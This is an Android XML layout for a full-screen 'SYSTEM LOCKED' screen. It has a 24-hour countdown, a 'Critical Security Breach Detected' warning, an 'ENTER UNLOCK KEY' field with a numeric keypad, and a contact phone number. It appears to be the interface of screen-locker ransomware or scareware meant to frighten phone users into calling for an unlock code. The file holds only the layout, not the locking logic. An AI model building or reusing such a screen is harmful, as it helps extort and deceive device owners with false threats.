<?xml version="1.0" encoding="utf-8"?>
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#000000"
    android:fillViewport="true">

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:gravity="center"
        android:orientation="vertical"
        android:padding="24dp">

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="SYSTEM LOCKED"
            android:textColor="#00FF41"
            android:textSize="32sp"
            android:textStyle="bold"
            android:shadowColor="#00FF41"
            android:shadowRadius="10" />

        <TextView
            android:id="@+id/v_timer"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_marginTop="8dp"
            android:fontFamily="monospace"
            android:text="24:00:00"
            android:textColor="#FF4444"
            android:textSize="30sp"
            android:textStyle="bold" />

        <TextView
            android:id="@+id/v_msg"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_marginTop="8dp"
            android:text="Critical Security Breach Detected"
            android:textColor="#FF4444"
            android:textSize="16sp"
            android:gravity="center" />

        <TextView
            android:id="@+id/v_display"
            android:layout_width="match_parent"
            android:layout_height="60dp"
            android:layout_marginTop="24dp"
            android:layout_marginHorizontal="20dp"
            android:background="@drawable/input_glow"
            android:gravity="center"
            android:hint="ENTER UNLOCK KEY"
            android:textColor="#00FF41"
            android:textColorHint="#113311"
            android:textSize="18sp"
            android:letterSpacing="0.2" />

        <TableLayout
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_marginTop="20dp"
            android:stretchColumns="0,1,2">

            <TableRow android:layout_marginBottom="8dp">
                <Button android:id="@+id/v_b1" android:text="1" style="@style/KeypadButtonStyle" />
                <Button android:id="@+id/v_b2" android:text="2" style="@style/KeypadButtonStyle" />
                <Button android:id="@+id/v_b3" android:text="3" style="@style/KeypadButtonStyle" />
            </TableRow>

            <TableRow android:layout_marginBottom="8dp">
                <Button android:id="@+id/v_b4" android:text="4" style="@style/KeypadButtonStyle" />
                <Button android:id="@+id/v_b5" android:text="5" style="@style/KeypadButtonStyle" />
                <Button android:id="@+id/v_b6" android:text="6" style="@style/KeypadButtonStyle" />
            </TableRow>

            <TableRow android:layout_marginBottom="8dp">
                <Button android:id="@+id/v_b7" android:text="7" style="@style/KeypadButtonStyle" />
                <Button android:id="@+id/v_b8" android:text="8" style="@style/KeypadButtonStyle" />
                <Button android:id="@+id/v_b9" android:text="9" style="@style/KeypadButtonStyle" />
            </TableRow>

            <TableRow>
                <Button android:id="@+id/v_del" android:text="DEL" style="@style/KeypadButtonStyle" android:textColor="#FF4444" />
                <Button android:id="@+id/v_b0" android:text="0" style="@style/KeypadButtonStyle" />
                <Button android:id="@+id/v_ok" android:text="OK" style="@style/KeypadButtonStyle" android:textColor="#00FF41" android:textStyle="bold" />
            </TableRow>
        </TableLayout>

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_marginTop="30dp"
            android:text="Contact: +62 831-8441-6710"
            android:textColor="#5500FF41"
            android:textSize="12sp"
            android:fontFamily="monospace" />

    </LinearLayout>
</ScrollView>
